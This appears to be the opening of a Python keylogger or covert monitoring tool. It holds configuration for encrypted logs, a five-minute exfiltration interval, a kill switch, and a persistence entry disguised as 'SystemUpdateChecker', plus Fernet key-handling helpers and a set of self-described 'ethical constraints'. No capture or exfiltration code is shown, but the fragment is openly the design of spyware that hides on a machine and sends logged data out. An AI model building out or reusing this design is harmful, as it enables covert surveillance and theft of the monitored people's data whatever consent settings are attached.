import os
from cryptography.fernet import Fernet

# Configuration settings
CONFIG = {
    'LOG_FILE': 'encrypted_logs.dat',
    'KEY_FILE': 'encryption.key',
    'EXFILTRATION_INTERVAL': 300,  # 5 minutes
    'MAX_LOG_SIZE': 1024 * 1024,  # 1MB
    'KILL_SWITCH_FILE': 'KILL_SWITCH.txt',
    'PERSISTENCE_NAME': 'SystemUpdateChecker',
    'LOG_RETENTION_DAYS': 7
}

def generate_key():
    """Generate a new encryption key"""
    return Fernet.generate_key()

def load_or_create_key():
    """Load existing key or create new one"""
    if os.path.exists(CONFIG['KEY_FILE']):
        with open(CONFIG['KEY_FILE'], 'rb') as key_file:
            return key_file.read()
    else:
        key = generate_key()
        with open(CONFIG['KEY_FILE'], 'wb') as key_file:
            key_file.write(key)
        return key

def get_cipher():
    """Get Fernet cipher instance"""
    key = load_or_create_key()
    return Fernet(key)

# Ethical constraints
ETHICAL_CONSTRAINTS = {
    'MAX_RUNTIME_HOURS': 24,  # Auto-terminate after 24 hours
    'REQUIRE_CONSENT_FILE': True,  # Require consent.txt file to run
    'LOG_WARNING_MESSAGES': True,  # Log warning messages
    'DISABLE_SENSITIVE_APPS': ['notepad.exe', 'cmd.exe'],  # Skip these apps
}
